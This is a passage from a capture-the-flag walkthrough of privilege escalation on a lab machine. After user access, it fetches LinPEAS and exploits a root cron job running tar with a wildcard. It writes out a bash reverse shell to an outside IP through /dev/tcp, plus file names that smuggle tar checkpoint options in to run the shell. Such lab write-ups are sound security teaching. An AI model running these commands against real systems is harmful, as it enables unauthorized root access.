Now that we have initial access to the system, we can begin looking for flags. With our current privileges, easily find the `user.txt` flag in Miles' home directory.

<center>

![4856ecb521d0dcd629bcad974e2dbb62.png](../../_resources/4856ecb521d0dcd629bcad974e2dbb62.png)

</center>

It remains to find the root flag. Let's go ahead and upgrade our shell with `python -c 'import pty; pty.spawn("/bin/bash")` for convenience. We will use LinPEAS to search for possible privesc avenues. We'll host a web server on our local machine in order to download `linpeas.sh` with `wget`; here, we'll want to save the file to the `/tmp` directory since we have write permissions there. Now use `chmod +x linpeas.sh` to make the file executable, and run it with `./linpeas.sh`. 

There are a few ways we can proceed from here, but we'll focus on looking at cronjobs. One interesting scheduled process sticks out.

<center>

![205bd8e761c33f959206f27942aaefae.png](../../_resources/205bd8e761c33f959206f27942aaefae.png)

![39aa328167e5abfbc3ec9158cbde5ac8.png](../../_resources/39aa328167e5abfbc3ec9158cbde5ac8.png)

</center>

We could try editing the `backup.sh`, but unfortunately we don't have write permissions. Let's look at the contents.

<center>

![93e4f30926ea59f72b46ccb80bad439a.png](../../_resources/93e4f30926ea59f72b46ccb80bad439a.png)

</center>

So, whenever this script runs, it moves into the `/var/www/html` directory and uses `tar` to compress the contents of the directory into a file in Miles' backups directory. Note that the script executes every minute, and it runs with root privileges.

If we look up the tar binary on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), we see that we can use it to spawn a new shell with root privileges. We need to use the following sequence of commands to add the relevant options before we can spawn the shell.

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.8.50.72/6666 0>&1' > /var/www/html/shell
chmod +x /var/www/html/shell
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=bash\ shell
```

Navigating to `/var/www/html`, we verify that all requires files are in the right place.

<center>

![e6f6c3f0e63acc1605ec8f7525027d77.png](../../_resources/e6f6c3f0e63acc1605ec8f7525027d77.png)

</center>

Now set up a netcat listener on a different port and run the following command to catch the reverse shell.

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

A quick search reveals the location of the `root.txt` flag.

<center>

![cf10e8a25a88a3c4e39d55b903d95fe2.png](../../_resources/cf10e8a25a88a3c4e39d55b903d95fe2.png)

![e57d9a5902ba8f9eff3a0df207d4fb7b.png](../../_resources/e57d9a5902ba8f9eff3a0df207d4fb7b.png)

</center>